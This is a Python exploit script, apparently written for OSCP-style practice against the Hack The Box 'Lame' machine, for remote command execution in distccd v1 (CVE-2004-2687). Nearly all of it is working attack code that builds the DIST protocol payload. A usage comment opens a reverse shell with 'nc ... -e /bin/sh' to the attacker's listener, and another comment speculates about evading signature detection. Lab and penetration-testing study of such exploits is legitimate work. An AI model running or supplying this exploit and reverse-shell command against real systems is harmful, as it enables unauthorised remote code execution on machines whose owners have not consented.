#!/usr/bin/python

# -*- coding: utf-8 -*-

"""
Tested and working on distccd v1
"""


'''
	distccd v1 RCE (CVE-2004-2687)
	
	This exploit is ported from a public Metasploit exploit code :
		https://www.exploit-db.com/exploits/9915

	The goal of that script is to avoid using Metasploit and to do it manually. (OSCP style)

	I'm aware a Nmap script exists but for some reason I could not get it to work.

	Lame Box (HTB):
		local>nc -lvp 1403

		local>./disccd_exploit.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.64 1403 -e /bin/sh"	

		Enjoy your shell

	Jean-Pierre LESUEUR
	@DarkCoderSc
'''

import socket
import string
import random
import argparse

'''
	Generate a random alpha num string (Evade some signature base detection?)
'''
def rand_text_alphanumeric(len):
	str = ""
	for i in range(len):
		str += random.choice(string.ascii_letters + string.digits)

	return str

'''
	Read STDERR / STDOUT returned by remote service.
'''
def read_std(s):
	s.recv(4) # Ignore

	len = int(s.recv(8), 16) # Get output length

	if len != 0:
		return s.recv(len)

'''
	Trigger Exploit
'''
def exploit(command, host, port):
	args = ["sh", "-c", command, "#", "-c", "main.c", "-o", "main.o"]

	payload = "DIST00000001" + "ARGC%.8x" % len(args)

	for arg in args:
		payload += "ARGV%.8x%s" % (len(arg), arg)

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	socket.setdefaulttimeout(5)
	s.settimeout(5)

	if s.connect_ex((host, port)) == 0:
		print("[\033[32mOK\033[39m] Connected to remote service")
		try:
			s.send(payload)

			dtag = "DOTI0000000A" + rand_text_alphanumeric(10)

			s.send(dtag)			

			s.recv(24)

			print("\n--- BEGIN BUFFER ---\n")
			buff = read_std(s) # STDERR

			if buff:
				print(buff)

			buff = read_std(s) # STDOUT
			if buff:
				print(buff)

			print("\n--- END BUFFER ---\n")

			print("[\033[32mOK\033[39m] Done.")
		except socket.timeout:
			print("[\033[31mKO\033[39m] Socket Timeout")
		except socket.error:
			print("[\033[31mKO\033[39m] Socket Error")
		except Exception:
			print("[\033[31mKO\033[39m] Exception Raised")
		finally:
			s.close()		
	else:
		print("[\033[31mKO\033[39m] Failed to connect to %s on port %d" % (host, port))


parser = argparse.ArgumentParser(description='DistCC Daemon - Command Execution (Metasploit)')

parser.add_argument('-t', action="store", dest="host", required=True, help="Target IP/HOST")
parser.add_argument('-p', action="store", type=int, dest="port", default=3632, help="DistCCd listening port")
parser.add_argument('-c', action="store", dest="command", default="id", help="Command to run on target system")

try:
	argv = parser.parse_args()

	exploit(argv.command, argv.host, argv.port)
except IOError:
	parse.error
